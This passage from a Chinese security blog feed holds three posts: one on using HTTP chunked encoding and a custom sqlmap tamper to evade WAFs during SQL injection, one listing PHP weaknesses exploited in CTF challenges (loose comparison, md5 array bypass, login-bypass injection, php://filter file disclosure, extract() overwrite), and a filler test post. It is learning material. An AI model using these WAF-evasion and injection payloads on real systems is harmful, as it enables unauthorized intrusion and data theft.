    <content type="html"><![CDATA[<h1 id="分块传输tamper"><a href="#分块传输tamper" class="headerlink" title="分块传输tamper"></a>分块传输tamper</h1><p>本文转载自： <a href="http://www.nmd5.com/?p=303">http://www.nmd5.com/?p=303</a>  大佬侵权删哦！~</p><p>最近看到大佬们都在搞分块传输，据说能吊打所有waf，所以我也跟随大佬们的脚步。</p><p>首先先了解下什么是分块传输。</p><p><img src="/images/20190308094925_59360.png" alt="blob"></p><hr><p><code>分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。通常，HTTP应答消息中发送的数据是整个发送的，Content-Length消息头字段表示数据的长度。数据的长度很重要，因为客户端需要知道哪里是应答消息的结束，以及后续应答消息的开始。然而，使用分块传输编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。通常数据块的大小是一致的，但也不总是这种情况。</code></p><hr><p>一般情况HTTP的Header包含Content-Length域来指明报文体的长度。有时候服务生成HTTP回应是无法确定消息大小的，比如大文件的下载，或者后台需要复杂的逻辑才能全部处理页面的请求，这时用需要实时生成消息长度，服务器一般使用chunked编码。</p><p>在进行Chunked编码传输时，在回复消息的Headers有transfer-coding域值为chunked，表示将用chunked编码传输内容。</p><p>理论知识就说到这。下面说说在写tamper过程中的坑，目前还有些问题没有解决。</p><hr><p>但是接下来的时间要忙些别的，所以把这段时间的结果先写到博客里面，以后有时间在继续把这些坑填上.</p><p>下面切换回正题，正常的post数据包如下</p><p><img src="/images/20190308101349_35348.png" alt="blob"></p><p>而分块传输的post数据包如下</p><p><img src="/images/20190308101355_13243.png" alt="blob"></p><p>服务器能正常接收到数据并返回了正常的页面内容</p><p>分块传输的post数据头部需要添加</p><figure class="highlight ruby"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Transfer</span>-<span class="hljs-title class_">Encoding</span><span class="hljs-symbol">:Chunked</span><br></code></pre></td></tr></table></figure><p>而post的数据是这种格式<br>&gt;2<br>id<br>2<br>=3<br>0</p><p>分块传输格式解析</p><p>2   #这个2表示下面数据的个数 可以在这个后面加入分号后面添加注释 比如 2;hello world 可以利用这个特性添加随机字符来干扰waf</p><p>id   #数据内容 内容就是id一共就两个 所以上面的个数是2</p><p>2   #同理 表示下面的数据的个数</p><p>=3  #这个也是同理 和前面的id连起来 post的数据就是 id=3 </p><p>0   #分块传输表示结束的方式 一个0和两个换号<br>    #换行<br>    #换行</p><p>既然知道了发送的数据格式，那下一步就是写个sqlmap的tamper<br>首先先把post数据的head的内容加上。</p><p><img src="/images/20190308103343_76255.png" alt="blob"></p><p>加上后sqlmap数据始终发不出去。</p><p><img src="/images/20190308102910_75066.png" alt="blob"></p><p>似乎遇到这个问题不只我一个，一个老哥是sqlmap加参数解决的这个问题 sqlmap.py -r 1.txt –headers=”Transfer-Encoding: chunked”</p><p>但是我的解决方法是 在encoding后面加了个空格 同时能正常发送数据包</p><p><img src="/images/20190308104112_63576.png" alt="blob"></p><p>sqlmap能正常发送出数据包 且服务器也能正常的接收到数据</p><p><img src="/images/20190308105624_54439.png" alt="blob"></p><p>但是sqlmap在payload生成后 还url编码下才发送给服务器，所以导致\n换行符或其他特殊字符会被编码，最后服务器无法理解。</p><p>目前的解决方法是通过给sqlmap加参数 –skip-urlencode 跳过url编码</p><p><img src="/images/20190308110312_98069.png" alt="blob"></p><p>但是我不想通过加参数，想直接写到tamper里面，各种疯狂百度谷歌还有问大佬们</p><p><img src="/images/20190308110820_69063.png" alt="blob"></p><p>但是都没结果，于是我就去翻sqlmap的源码。</p><p>找到了urlencode的位置 也找到了最后给调用给payload编码的位置，但是还是不知道怎么写到tamper里面，如果改源码的话，那样就很容易，但是这样毫无意义。</p><p>还有个最重要的问题，那就是sqlmap的tamper无法获取payload的前面的参数，比如id=3 无法把payload的内容写到id=的前面</p><p>目前我的解决方法是手工把要注入的post包先把格式改下。</p><p><img src="/images/20190308112655_96042.png" alt="blob"></p><p>然后就用sqlmap跑起来<br><code>python sqlmap/sqlmap.py -r 1.txt --tamper=fkcs --skip-urlencode</code></p><p><img src="/images/20190308114103_74500.png" alt="blob"></p><p><img src="/images/20190308114113_28322.png" alt="blob"></p><p>能正常使用，但是最大的问题在于怎么修改payload前面的参数，这样手工提前修改数据真的是low的不行，所以算个残疾品，等以后有时间再继续完善它。</p><p>相关文章：<br>利用分块传输吊打所以wa<br><a href="https://www.freebuf.com/articles/web/194351.htmlf">https://www.freebuf.com/articles/web/194351.htmlf</a></p><p>HTTP协议bypass WAF(狗/盾)<br><a href="https://www.t00ls.net/thread-49138-1-1.html">https://www.t00ls.net/thread-49138-1-1.html</a></p><p>SQLMAP|阅读手记一{从sqlmap.py开始到参数分析}<br><a href="http://www.wupco.cn/?p=323">http://www.wupco.cn/?p=323</a></p><p>定制Sqlmap<br><a href="http://lietolive.com/sqlmap/%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/2018/01/24/%E5%AE%9A%E5%88%B6Sqlmap.html">http://lietolive.com/sqlmap/%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/2018/01/24/%E5%AE%9A%E5%88%B6Sqlmap.html</a></p><p>SQLMAP进阶使用<br><a href="http://www.vuln.cn/6495">http://www.vuln.cn/6495</a></p><p>sqlmap源码解析之test和boundary组合生成payload<br><a href="http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/">http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/</a></p><p>sqlmap 的源码学习笔记一之目录结构<br><a href="https://blog.csdn.net/qq_29277155/article/details/51646932">https://blog.csdn.net/qq_29277155/article/details/51646932</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF中的PHP常见姿势分析</title>
    <link href="/2019/11/05/ctf-php-zishi.html"/>
    <url>/2019/11/05/ctf-php-zishi.html</url>
    
    <content type="html"><![CDATA[<h1 id="CTF中的php常见姿势分析"><a href="#CTF中的php常见姿势分析" class="headerlink" title="CTF中的php常见姿势分析"></a>CTF中的php常见姿势分析</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;  <span class="hljs-comment">//eregi字符串对比</span><br><br> <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br><br> <span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><h2 id="2-isset-判断变量是否定义过"><a href="#2-isset-判断变量是否定义过" class="headerlink" title="2.isset 判断变量是否定义过"></a>2.isset 判断变量是否定义过</h2><h2 id="3-比较符"><a href="#3-比较符" class="headerlink" title="3.比较符"></a>3.<strong>比较符</strong></h2><p>$a==$b  松散比较</p><p>===    完全等于</p><p>=     大于等于</p><p>!=    如果类型转换后$a不等于$b,Ture</p><p>!==    不完全等于，如果$a不等于$b或者它们类型不同，Ture</p><p>当php进行一些数学计算的时候，当有一个对比参数是整数的时候,会把另外一个参数强制转换为整数。</p><p>1 var_dump(0 == ‘0’); // true</p><p>2 var_dump(0 == ‘abcdefg’); // true</p><p>3 var_dump(0 === ‘abcdefg’); // false</p><p>4 var_dump(1 == ‘1abcdef’); // true</p><p>* bool类型的true跟任意字符串可以弱类型相等</p><p>在某些情况下，PHP会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: ‘3’ == ‘3ascasd’结果为true。</p><h2 id="4-eval可以直接执行php代码"><a href="#4-eval可以直接执行php代码" class="headerlink" title="4.eval可以直接执行php代码"></a>4.<strong>eval</strong>可以直接执行php代码</h2><h2 id="5-intval-将变量转成整数类型"><a href="#5-intval-将变量转成整数类型" class="headerlink" title="5.intval  将变量转成整数类型"></a>5.<strong>intval</strong>  将变量转成整数类型</h2><h2 id="6-ereg-函数"><a href="#6-ereg-函数" class="headerlink" title="6.ereg()函数"></a>6.<strong>ereg()</strong>函数</h2><h6 id="用指定的模式搜索一个字符串中指定的字符串-如果匹配成功返回true-否则-则返回false。搜索字母的字符是大小写敏感的。"><a href="#用指定的模式搜索一个字符串中指定的字符串-如果匹配成功返回true-否则-则返回false。搜索字母的字符是大小写敏感的。" class="headerlink" title="用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。"></a>用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ereg</span><span class="hljs-params">(<span class="hljs-built_in">string</span> pattern, <span class="hljs-built_in">string</span> originalstring, [<span class="hljs-built_in">array</span> regs])</span>;<br></code></pre></td></tr></table></figure><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$email_id</span> = <span class="hljs-string">&quot;admin@tutorialspoint.com&quot;</span>;<br><br><span class="hljs-variable">$retval</span> = <span class="hljs-title function_ invoke__">ereg</span>(<span class="hljs-string">&quot;(\.)(com$)&quot;</span>, <span class="hljs-variable">$email_id</span>);<br></code></pre></td></tr></table></figure><p>ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。</p><p>这里ereg有两个漏洞：</p><p>  ①%00截断及遇到%00则默认为字符串的结束</p><p>  ②当ntf为数组时它的返回值不是FALSE</p><h2 id="7-strpos-—-查找字符串首次出现的位置"><a href="#7-strpos-—-查找字符串首次出现的位置" class="headerlink" title="7.strpos — 查找字符串首次出现的位置"></a>7.<strong>strpos</strong> — 查找字符串首次出现的位置</h2><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$mystring</span> = <span class="hljs-string">&#x27;abc&#x27;</span>;<br><span class="hljs-variable">$findme</span>  = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$mystring</span>, <span class="hljs-variable">$findme</span>);<br></code></pre></td></tr></table></figure><h2 id="8-GET可以接受数组但MD5不能处理数组结构的数据"><a href="#8-GET可以接受数组但MD5不能处理数组结构的数据" class="headerlink" title="8.$_GET可以接受数组但MD5不能处理数组结构的数据"></a>8.$_GET可以接受数组但MD5不能处理数组结构的数据</h2><p><strong>md5（）</strong>不能处理数组结构的数据</p><p>利用此漏洞构造<code>index.php?a[]=1&amp;b[]=2</code></p><p>构造<code>?a[]=1&amp;b[]=2</code>这样md5函数无法处理数组返回false完成匹配得到flag</p><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9"><a href="#9" class="headerlink" title="9."></a><strong>9.</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[user] &amp;&amp; <span class="hljs-variable">$_POST</span>[pass]) &#123;<br><br>  <span class="hljs-title function_ invoke__">mysql_connect</span>(SAE_MYSQL_HOST_M . <span class="hljs-string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);<br><br> <span class="hljs-title function_ invoke__">mysql_select_db</span>(SAE_MYSQL_DB);<br><br> <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[user]);<br><br> <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[pass]));<br><br> <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select user from ctf where （user=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;) and (pw=&#x27;&quot;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$sql</span>;<br><br> <span class="hljs-variable">$query</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));<br><br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$query</span>[user]==<span class="hljs-string">&quot;admin&quot;</span>) &#123;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;</span>;<br><br> &#125;<br><br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$query</span>[user] != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br><br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;</span>);<br><br> &#125;<br><br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>[user];<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看见括号了没，我一直没看见··········</p><p>最简单的注入 和password无关</p><p><code>user=admin ‘)# //注意括号要闭合不然报错 我就是被坑的。</code></p><h2 id="12-PHP对于这个-符号"><a href="#12-PHP对于这个-符号" class="headerlink" title="12.PHP对于这个@符号"></a>12.PHP对于这个<strong>@</strong>符号</h2><h4 id="之前很少在意，只知道它是错误屏蔽的符号"><a href="#之前很少在意，只知道它是错误屏蔽的符号" class="headerlink" title="之前很少在意，只知道它是错误屏蔽的符号"></a>之前很少在意，只知道它是错误屏蔽的符号</h4><h2 id="11-一般形式：strcmp-字符串1，字符串2"><a href="#11-一般形式：strcmp-字符串1，字符串2" class="headerlink" title="11.一般形式：strcmp(字符串1，字符串2)"></a>11.一般形式：<strong>strcmp</strong>(字符串1，字符串2)</h2><p>说明：</p><p>当s1&lt;s2时，返回为负数 注意不是-1  true</p><p>当s1==s2时，返回值= 0                      false</p><p>当s1&gt;s2时，返回正数 注意不是1       true</p><h2 id="11-strlen-判断字符串长度"><a href="#11-strlen-判断字符串长度" class="headerlink" title="11.strlen  判断字符串长度"></a>11<strong>.strlen</strong>  判断字符串长度</h2><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br></code></pre></td></tr></table></figure><p>科学记数法，由于要使密码长度小于8或值大于9999999，可以使用1e8或1e9满足条件。</p><h2 id="12-文件包含漏洞"><a href="#12-文件包含漏洞" class="headerlink" title="12.文件包含漏洞"></a>12.<strong>文件包含漏洞</strong></h2><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p><p>同时我也借此机会学到了文件读取的相关知识。</p><p>  <code>include “test.php”php</code>文件包含，在执行流中插入写在其他文件中的有用的代码。读取的时候也是数据流形式，因此可以使用php://filter进行过滤，返回值为0,1。</p><p>  <code>readfile(“test.php”)</code>是将文件以数据流的形式读取过来，并不会执行，但会在前台浏览器上进行解析。返回值是字节数多少。</p><p>  <code>file_get_contents(&quot;test.php&quot;)</code>返回值为文本内容</p><p>  此题运用的就是关于数据流过滤的文件包含，我们一般在进行文件包含的时候都这么写include “test.php”获得的就是test.php直接解析出来。但如果运用readfile(“test.php”) 就不进行解析，导致无法在浏览器前台进行显示。那么问题来了看题</p><p>简单的重复一下他的意思</p><p>注解：</p><p>1.<code>php://filter/</code>可用于处理打开的数据流，起到过滤作用。如果源文件为.php则很有可能在前台显示不出来。</p><p>2.此时我们采用的方法是，先让文件转化为base64格式（<code>convert.base64-encode</code>）然后再输出，这样不论是什么格式的文件都可以在前台输出。</p><p>3.再次解码就可得到源代码，怎么样是不是很神奇啊！</p><p>例<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><h2 id="13-extract-变量覆盖"><a href="#13-extract-变量覆盖" class="headerlink" title="13.extract 变量覆盖"></a>13.extract 变量覆盖</h2><p>总的来说是extract() 函数从数组中将变量导入到当前的符号表，典型的变量覆盖。</p><p>例，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123; ?&gt;<br><br> &lt;?php<br><br> extract(<span class="hljs-variable">$_POST</span>);<br><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$thepassword_123</span>) &#123; ?&gt;<br><br>      &lt;div class=<span class="hljs-string">&quot;alert alert-success&quot;</span>&gt;<br><br>          &lt;code&gt;&lt;?php <span class="hljs-built_in">echo</span> <span class="hljs-variable">$theflag</span>; ?&gt;&lt;/code&gt;<br><br>   &lt;/div&gt;<br><br>  &lt;?php &#125; ?&gt;<br><br> &lt;?php &#125; ?&gt;<br><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$thepassword_123</span>) &#123; ?&gt;<br></code></pre></td></tr></table></figure><p> 只需要覆盖$pass、$thepassword_123这两个变量使他们相等即可。</p><h2 id="14-php上传截断"><a href="#14-php上传截断" class="headerlink" title="14.php上传截断"></a>14.php<strong>上传截断</strong></h2><h2 id="15-set-time-limit-0"><a href="#15-set-time-limit-0" class="headerlink" title="15.set_time_limit(0);"></a>15.<strong>set_time_limit(0);</strong></h2><p>括号里边的数字是执行时间，如果为零说明永久执行直到程序结束，如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。</p><h2 id="16-PHP变量覆盖"><a href="#16-PHP变量覆盖" class="headerlink" title="16.PHP变量覆盖"></a>16.<strong>PHP变量覆盖</strong></h2><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123; <span class="hljs-meta">?&gt;</span><br>  <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$thepassword_123</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$theflag</span>;<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>在第三行, 运用了<strong>extract()</strong>函数, 将POST方式获得的变量导入到当前的符号表中. </p><p>然后判断$pass 与$thepassword_123两个变量的内容是否相等.</p><p>但是, 由于extract()函数的不足之处, 导致这段代码存在一个变量覆盖漏洞. </p><p>只要我们这样构造url</p><p>/?pass=&amp;thepassword_123=</p><p>那么, 我们可以发现, $<strong>pass</strong> 变量和$<strong>thepassword_123</strong>变量的内容都会被设置成空字符串.这样就使得两个变量被覆盖。</p><h2 id="17-PHP超全局变量"><a href="#17-PHP超全局变量" class="headerlink" title="17.PHP超全局变量"></a>17.PHP超全局变量</h2><p><strong>$GLOBALS</strong> — 引用全局作用域中可用的全部变量</p><p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。</p><p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);<span class="hljs-comment">//这里涉及超全局变量的使用</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>构造特殊url：<a href="http://120.24.86.145:8004/index1.php?args=GLOBALS">http://120.24.86.145:8004/index1.php?args=GLOBALS</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2019/11/03/hello-world.html"/>
    <url>/2019/11/03/hello-world.html</url>
    
    <content type="html"><![CDATA[<p>是的，从这篇文章开始，我的博客就开始更新了~😁</p><p>— 下面的内容忽略，仅供测试</p><p>可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。<a href="/saas_test_59990ae.html">a</a>可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 